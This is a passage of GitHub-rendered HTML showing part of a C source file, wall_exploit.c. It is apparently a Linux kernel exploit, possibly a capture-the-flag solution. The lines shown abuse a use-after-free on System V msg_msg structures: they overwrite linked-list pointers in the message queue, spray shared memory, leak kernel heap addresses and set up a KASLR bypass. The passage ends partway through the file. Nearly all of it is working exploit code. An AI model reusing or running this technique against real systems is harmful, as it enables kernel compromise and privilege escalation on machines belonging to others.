          <td id="file-wall_exploit-c-LC498" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>(buffer, (<span class="pl-k">void</span> *)&amp;evil, <span class="pl-c1">0x20</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L499" class="blob-num js-line-number js-code-nav-line-number" data-line-number="499"></td>
          <td id="file-wall_exploit-c-LC499" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">edit</span>(fd, <span class="pl-c1">0</span>, buffer, OUTBOUND, <span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L500" class="blob-num js-line-number js-code-nav-line-number" data-line-number="500"></td>
          <td id="file-wall_exploit-c-LC500" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L501" class="blob-num js-line-number js-code-nav-line-number" data-line-number="501"></td>
          <td id="file-wall_exploit-c-LC501" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (<span class="pl-k">int</span> i = <span class="pl-c1">0</span>; i &lt; <span class="pl-c1">5</span>; i++)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L502" class="blob-num js-line-number js-code-nav-line-number" data-line-number="502"></td>
          <td id="file-wall_exploit-c-LC502" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L503" class="blob-num js-line-number js-code-nav-line-number" data-line-number="503"></td>
          <td id="file-wall_exploit-c-LC503" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">char</span> tmp_cmp[<span class="pl-c1">8</span>];</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L504" class="blob-num js-line-number js-code-nav-line-number" data-line-number="504"></td>
          <td id="file-wall_exploit-c-LC504" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">int32_t</span> count = <span class="pl-c1">2</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L505" class="blob-num js-line-number js-code-nav-line-number" data-line-number="505"></td>
          <td id="file-wall_exploit-c-LC505" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">void</span> *offset;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L506" class="blob-num js-line-number js-code-nav-line-number" data-line-number="506"></td>
          <td id="file-wall_exploit-c-LC506" class="blob-code blob-code-inner js-file-line">        size = <span class="pl-c1">0x40</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L507" class="blob-num js-line-number js-code-nav-line-number" data-line-number="507"></td>
          <td id="file-wall_exploit-c-LC507" class="blob-code blob-code-inner js-file-line">        message-&gt;<span class="pl-smi">mtype</span> = count++;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L508" class="blob-num js-line-number js-code-nav-line-number" data-line-number="508"></td>
          <td id="file-wall_exploit-c-LC508" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memset</span>(message-&gt;<span class="pl-smi">mtext</span>, <span class="pl-c1">0x75</span> + <span class="pl-c1">1</span> + i, size);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L509" class="blob-num js-line-number js-code-nav-line-number" data-line-number="509"></td>
          <td id="file-wall_exploit-c-LC509" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memset</span>(tmp_cmp, <span class="pl-c1">0x75</span> + <span class="pl-c1">1</span> + i, size);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L510" class="blob-num js-line-number js-code-nav-line-number" data-line-number="510"></td>
          <td id="file-wall_exploit-c-LC510" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">send_msg</span>(front_qid, message, size - <span class="pl-c1">0x30</span>, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L511" class="blob-num js-line-number js-code-nav-line-number" data-line-number="511"></td>
          <td id="file-wall_exploit-c-LC511" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">get_msg</span>(front_qid, recieved, <span class="pl-c1">0xfd0</span>, <span class="pl-c1">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L512" class="blob-num js-line-number js-code-nav-line-number" data-line-number="512"></td>
          <td id="file-wall_exploit-c-LC512" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">//</span>hexprint(recieved, 0xfd0);</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L513" class="blob-num js-line-number js-code-nav-line-number" data-line-number="513"></td>
          <td id="file-wall_exploit-c-LC513" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> ((offset = <span class="pl-c1">memmem</span>(recieved, <span class="pl-c1">0xfd0</span>, tmp_cmp, <span class="pl-c1">8</span>)))</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L514" class="blob-num js-line-number js-code-nav-line-number" data-line-number="514"></td>
          <td id="file-wall_exploit-c-LC514" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L515" class="blob-num js-line-number js-code-nav-line-number" data-line-number="515"></td>
          <td id="file-wall_exploit-c-LC515" class="blob-code blob-code-inner js-file-line">            </td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L516" class="blob-num js-line-number js-code-nav-line-number" data-line-number="516"></td>
          <td id="file-wall_exploit-c-LC516" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)&amp;queue_leak, (<span class="pl-k">void</span> *)offset - <span class="pl-c1">0x30</span>, <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L517" class="blob-num js-line-number js-code-nav-line-number" data-line-number="517"></td>
          <td id="file-wall_exploit-c-LC517" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>front qid queue_leak: 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, queue_leak);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L518" class="blob-num js-line-number js-code-nav-line-number" data-line-number="518"></td>
          <td id="file-wall_exploit-c-LC518" class="blob-code blob-code-inner js-file-line">            evil.<span class="pl-smi">ll_next</span> = (<span class="pl-k">void</span> *)queue_leak;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L519" class="blob-num js-line-number js-code-nav-line-number" data-line-number="519"></td>
          <td id="file-wall_exploit-c-LC519" class="blob-code blob-code-inner js-file-line">            evil.<span class="pl-smi">ll_prev</span> = (<span class="pl-k">void</span> *)queue_leak;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L520" class="blob-num js-line-number js-code-nav-line-number" data-line-number="520"></td>
          <td id="file-wall_exploit-c-LC520" class="blob-code blob-code-inner js-file-line">            evil.<span class="pl-smi">m_type</span> = <span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L521" class="blob-num js-line-number js-code-nav-line-number" data-line-number="521"></td>
          <td id="file-wall_exploit-c-LC521" class="blob-code blob-code-inner js-file-line">            evil.<span class="pl-smi">m_ts</span> = <span class="pl-c1">0xfd0</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L522" class="blob-num js-line-number js-code-nav-line-number" data-line-number="522"></td>
          <td id="file-wall_exploit-c-LC522" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">memset</span>(buffer, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(buffer));</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L523" class="blob-num js-line-number js-code-nav-line-number" data-line-number="523"></td>
          <td id="file-wall_exploit-c-LC523" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">memcpy</span>(buffer, (<span class="pl-k">void</span> *)&amp;evil, <span class="pl-c1">0x20</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L524" class="blob-num js-line-number js-code-nav-line-number" data-line-number="524"></td>
          <td id="file-wall_exploit-c-LC524" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">edit</span>(fd, <span class="pl-c1">0</span>, buffer, OUTBOUND, <span class="pl-c1">1</span>); <span class="pl-c"><span class="pl-c">//</span> fixes it because traverses from head, mqueue tail isn't traversed from</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L525" class="blob-num js-line-number js-code-nav-line-number" data-line-number="525"></td>
          <td id="file-wall_exploit-c-LC525" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">break</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L526" class="blob-num js-line-number js-code-nav-line-number" data-line-number="526"></td>
          <td id="file-wall_exploit-c-LC526" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L527" class="blob-num js-line-number js-code-nav-line-number" data-line-number="527"></td>
          <td id="file-wall_exploit-c-LC527" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L528" class="blob-num js-line-number js-code-nav-line-number" data-line-number="528"></td>
          <td id="file-wall_exploit-c-LC528" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L529" class="blob-num js-line-number js-code-nav-line-number" data-line-number="529"></td>
          <td id="file-wall_exploit-c-LC529" class="blob-code blob-code-inner js-file-line">            queue_leak = <span class="pl-c1">0x1337</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L530" class="blob-num js-line-number js-code-nav-line-number" data-line-number="530"></td>
          <td id="file-wall_exploit-c-LC530" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L531" class="blob-num js-line-number js-code-nav-line-number" data-line-number="531"></td>
          <td id="file-wall_exploit-c-LC531" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L532" class="blob-num js-line-number js-code-nav-line-number" data-line-number="532"></td>
          <td id="file-wall_exploit-c-LC532" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (queue_leak == <span class="pl-c1">0x1337</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L533" class="blob-num js-line-number js-code-nav-line-number" data-line-number="533"></td>
          <td id="file-wall_exploit-c-LC533" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L534" class="blob-num js-line-number js-code-nav-line-number" data-line-number="534"></td>
          <td id="file-wall_exploit-c-LC534" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">"</span>unable to find queue leak<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L535" class="blob-num js-line-number js-code-nav-line-number" data-line-number="535"></td>
          <td id="file-wall_exploit-c-LC535" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L536" class="blob-num js-line-number js-code-nav-line-number" data-line-number="536"></td>
          <td id="file-wall_exploit-c-LC536" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L537" class="blob-num js-line-number js-code-nav-line-number" data-line-number="537"></td>
          <td id="file-wall_exploit-c-LC537" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L538" class="blob-num js-line-number js-code-nav-line-number" data-line-number="538"></td>
          <td id="file-wall_exploit-c-LC538" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> hunting for the message queue and msg_msg that can be overwritten from controlled msg of front_qid</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L539" class="blob-num js-line-number js-code-nav-line-number" data-line-number="539"></td>
          <td id="file-wall_exploit-c-LC539" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (<span class="pl-k">int</span> i =<span class="pl-c1">0</span>; i &lt; <span class="pl-c1">50</span>; i++)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L540" class="blob-num js-line-number js-code-nav-line-number" data-line-number="540"></td>
          <td id="file-wall_exploit-c-LC540" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L541" class="blob-num js-line-number js-code-nav-line-number" data-line-number="541"></td>
          <td id="file-wall_exploit-c-LC541" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">char</span> temp_cmp[<span class="pl-c1">8</span>];</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L542" class="blob-num js-line-number js-code-nav-line-number" data-line-number="542"></td>
          <td id="file-wall_exploit-c-LC542" class="blob-code blob-code-inner js-file-line">        target_qid = <span class="pl-c1">make_queue</span>(IPC_PRIVATE, <span class="pl-c1">0666</span> | IPC_CREAT);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L543" class="blob-num js-line-number js-code-nav-line-number" data-line-number="543"></td>
          <td id="file-wall_exploit-c-LC543" class="blob-code blob-code-inner js-file-line">        size = <span class="pl-c1">0x40</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L544" class="blob-num js-line-number js-code-nav-line-number" data-line-number="544"></td>
          <td id="file-wall_exploit-c-LC544" class="blob-code blob-code-inner js-file-line">        message-&gt;<span class="pl-smi">mtype</span> = <span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L545" class="blob-num js-line-number js-code-nav-line-number" data-line-number="545"></td>
          <td id="file-wall_exploit-c-LC545" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memset</span>(message-&gt;<span class="pl-smi">mtext</span>, <span class="pl-c1">0x41</span> + <span class="pl-c1">1</span> + i, size);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L546" class="blob-num js-line-number js-code-nav-line-number" data-line-number="546"></td>
          <td id="file-wall_exploit-c-LC546" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memset</span>(temp_cmp, <span class="pl-c1">0x41</span> + <span class="pl-c1">1</span> + i, <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L547" class="blob-num js-line-number js-code-nav-line-number" data-line-number="547"></td>
          <td id="file-wall_exploit-c-LC547" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">send_msg</span>(target_qid, message, size - <span class="pl-c1">0x30</span>, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L548" class="blob-num js-line-number js-code-nav-line-number" data-line-number="548"></td>
          <td id="file-wall_exploit-c-LC548" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">get_msg</span>(front_qid, recieved, <span class="pl-c1">0xfd0</span>, <span class="pl-c1">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L549" class="blob-num js-line-number js-code-nav-line-number" data-line-number="549"></td>
          <td id="file-wall_exploit-c-LC549" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-c1">memmem</span>(recieved, <span class="pl-c1">0xfd0</span>, temp_cmp, <span class="pl-c1">8</span>))</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L550" class="blob-num js-line-number js-code-nav-line-number" data-line-number="550"></td>
          <td id="file-wall_exploit-c-LC550" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L551" class="blob-num js-line-number js-code-nav-line-number" data-line-number="551"></td>
          <td id="file-wall_exploit-c-LC551" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">"</span>found msg_msg to target!<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L552" class="blob-num js-line-number js-code-nav-line-number" data-line-number="552"></td>
          <td id="file-wall_exploit-c-LC552" class="blob-code blob-code-inner js-file-line">            msg_offset = (<span class="pl-k">void</span> *)<span class="pl-c1">memmem</span>(recieved, <span class="pl-c1">0xfd0</span>, temp_cmp, <span class="pl-c1">8</span>) - (<span class="pl-k">void</span> *)recieved - <span class="pl-c1">0x30</span>; <span class="pl-c"><span class="pl-c">//</span>from perspective of recieved buffer, not in memory</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L553" class="blob-num js-line-number js-code-nav-line-number" data-line-number="553"></td>
          <td id="file-wall_exploit-c-LC553" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>offset from current UAF'd msg: 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, msg_offset);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L554" class="blob-num js-line-number js-code-nav-line-number" data-line-number="554"></td>
          <td id="file-wall_exploit-c-LC554" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">break</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L555" class="blob-num js-line-number js-code-nav-line-number" data-line-number="555"></td>
          <td id="file-wall_exploit-c-LC555" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L556" class="blob-num js-line-number js-code-nav-line-number" data-line-number="556"></td>
          <td id="file-wall_exploit-c-LC556" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">else</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L557" class="blob-num js-line-number js-code-nav-line-number" data-line-number="557"></td>
          <td id="file-wall_exploit-c-LC557" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L558" class="blob-num js-line-number js-code-nav-line-number" data-line-number="558"></td>
          <td id="file-wall_exploit-c-LC558" class="blob-code blob-code-inner js-file-line">            target_qid = -<span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L559" class="blob-num js-line-number js-code-nav-line-number" data-line-number="559"></td>
          <td id="file-wall_exploit-c-LC559" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L560" class="blob-num js-line-number js-code-nav-line-number" data-line-number="560"></td>
          <td id="file-wall_exploit-c-LC560" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L561" class="blob-num js-line-number js-code-nav-line-number" data-line-number="561"></td>
          <td id="file-wall_exploit-c-LC561" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">if</span> (target_qid == -<span class="pl-c1">1</span>)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L562" class="blob-num js-line-number js-code-nav-line-number" data-line-number="562"></td>
          <td id="file-wall_exploit-c-LC562" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L563" class="blob-num js-line-number js-code-nav-line-number" data-line-number="563"></td>
          <td id="file-wall_exploit-c-LC563" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">puts</span>(<span class="pl-s"><span class="pl-pds">"</span>unable to get useful later msg_msg to target<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L564" class="blob-num js-line-number js-code-nav-line-number" data-line-number="564"></td>
          <td id="file-wall_exploit-c-LC564" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L565" class="blob-num js-line-number js-code-nav-line-number" data-line-number="565"></td>
          <td id="file-wall_exploit-c-LC565" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L566" class="blob-num js-line-number js-code-nav-line-number" data-line-number="566"></td>
          <td id="file-wall_exploit-c-LC566" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> hexprint(recieved, 0xfd0);</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L567" class="blob-num js-line-number js-code-nav-line-number" data-line-number="567"></td>
          <td id="file-wall_exploit-c-LC567" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L568" class="blob-num js-line-number js-code-nav-line-number" data-line-number="568"></td>
          <td id="file-wall_exploit-c-LC568" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> leak a 4k msg address</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L569" class="blob-num js-line-number js-code-nav-line-number" data-line-number="569"></td>
          <td id="file-wall_exploit-c-LC569" class="blob-code blob-code-inner js-file-line">    size = <span class="pl-c1">0x1010</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L570" class="blob-num js-line-number js-code-nav-line-number" data-line-number="570"></td>
          <td id="file-wall_exploit-c-LC570" class="blob-code blob-code-inner js-file-line">    message-&gt;<span class="pl-smi">mtype</span> = <span class="pl-c1">2</span>;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L571" class="blob-num js-line-number js-code-nav-line-number" data-line-number="571"></td>
          <td id="file-wall_exploit-c-LC571" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(message-&gt;<span class="pl-smi">mtext</span>, <span class="pl-c1">0</span>, size);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L572" class="blob-num js-line-number js-code-nav-line-number" data-line-number="572"></td>
          <td id="file-wall_exploit-c-LC572" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L573" class="blob-num js-line-number js-code-nav-line-number" data-line-number="573"></td>
          <td id="file-wall_exploit-c-LC573" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> spray shmem beforehand</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L574" class="blob-num js-line-number js-code-nav-line-number" data-line-number="574"></td>
          <td id="file-wall_exploit-c-LC574" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">int</span> shmid; <span class="pl-c"><span class="pl-c">//</span> shmem leak for kernel data leak to rebase kernel</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L575" class="blob-num js-line-number js-code-nav-line-number" data-line-number="575"></td>
          <td id="file-wall_exploit-c-LC575" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *shmaddr;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L576" class="blob-num js-line-number js-code-nav-line-number" data-line-number="576"></td>
          <td id="file-wall_exploit-c-LC576" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (<span class="pl-k">int</span> i = <span class="pl-c1">0</span>; i &lt; <span class="pl-c1">0x40</span>; i++)</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L577" class="blob-num js-line-number js-code-nav-line-number" data-line-number="577"></td>
          <td id="file-wall_exploit-c-LC577" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L578" class="blob-num js-line-number js-code-nav-line-number" data-line-number="578"></td>
          <td id="file-wall_exploit-c-LC578" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> ((shmid = <span class="pl-c1">shmget</span>(IPC_PRIVATE, <span class="pl-c1">100</span>, <span class="pl-c1">0600</span>)) == -<span class="pl-c1">1</span>) </td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L579" class="blob-num js-line-number js-code-nav-line-number" data-line-number="579"></td>
          <td id="file-wall_exploit-c-LC579" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L580" class="blob-num js-line-number js-code-nav-line-number" data-line-number="580"></td>
          <td id="file-wall_exploit-c-LC580" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>shmget error<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L581" class="blob-num js-line-number js-code-nav-line-number" data-line-number="581"></td>
          <td id="file-wall_exploit-c-LC581" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L582" class="blob-num js-line-number js-code-nav-line-number" data-line-number="582"></td>
          <td id="file-wall_exploit-c-LC582" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L583" class="blob-num js-line-number js-code-nav-line-number" data-line-number="583"></td>
          <td id="file-wall_exploit-c-LC583" class="blob-code blob-code-inner js-file-line">        shmaddr = <span class="pl-c1">shmat</span>(shmid, <span class="pl-c1">NULL</span>, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L584" class="blob-num js-line-number js-code-nav-line-number" data-line-number="584"></td>
          <td id="file-wall_exploit-c-LC584" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (shmaddr == (<span class="pl-k">void</span> *)-<span class="pl-c1">1</span>) </td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L585" class="blob-num js-line-number js-code-nav-line-number" data-line-number="585"></td>
          <td id="file-wall_exploit-c-LC585" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L586" class="blob-num js-line-number js-code-nav-line-number" data-line-number="586"></td>
          <td id="file-wall_exploit-c-LC586" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>shmat error<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L587" class="blob-num js-line-number js-code-nav-line-number" data-line-number="587"></td>
          <td id="file-wall_exploit-c-LC587" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L588" class="blob-num js-line-number js-code-nav-line-number" data-line-number="588"></td>
          <td id="file-wall_exploit-c-LC588" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L589" class="blob-num js-line-number js-code-nav-line-number" data-line-number="589"></td>
          <td id="file-wall_exploit-c-LC589" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L590" class="blob-num js-line-number js-code-nav-line-number" data-line-number="590"></td>
          <td id="file-wall_exploit-c-LC590" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> just pray qwords above this chunk is null, otherwise kernel panic when we try to arb read from it</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L591" class="blob-num js-line-number js-code-nav-line-number" data-line-number="591"></td>
          <td id="file-wall_exploit-c-LC591" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">send_msg</span>(target_qid, message, size - <span class="pl-c1">0x30</span>, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L592" class="blob-num js-line-number js-code-nav-line-number" data-line-number="592"></td>
          <td id="file-wall_exploit-c-LC592" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">get_msg</span>(front_qid, recieved, <span class="pl-c1">0xfd0</span>, <span class="pl-c1">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L593" class="blob-num js-line-number js-code-nav-line-number" data-line-number="593"></td>
          <td id="file-wall_exploit-c-LC593" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L594" class="blob-num js-line-number js-code-nav-line-number" data-line-number="594"></td>
          <td id="file-wall_exploit-c-LC594" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint64_t</span> big_msg;</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L595" class="blob-num js-line-number js-code-nav-line-number" data-line-number="595"></td>
          <td id="file-wall_exploit-c-LC595" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span> *)&amp;big_msg, (<span class="pl-k">void</span> *)recieved + msg_offset, <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L596" class="blob-num js-line-number js-code-nav-line-number" data-line-number="596"></td>
          <td id="file-wall_exploit-c-LC596" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>leaked 4k msg_msg address: 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, big_msg);</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L597" class="blob-num js-line-number js-code-nav-line-number" data-line-number="597"></td>
          <td id="file-wall_exploit-c-LC597" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L598" class="blob-num js-line-number js-code-nav-line-number" data-line-number="598"></td>
          <td id="file-wall_exploit-c-LC598" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> time for kaslr leak, since we are using from shmem structures, fg-kaslr bypassable</span></td>
        </tr>
        <tr>
          <td id="file-wall_exploit-c-L599" class="blob-num js-line-number js-code-nav-line-number" data-line-number="599"></td>
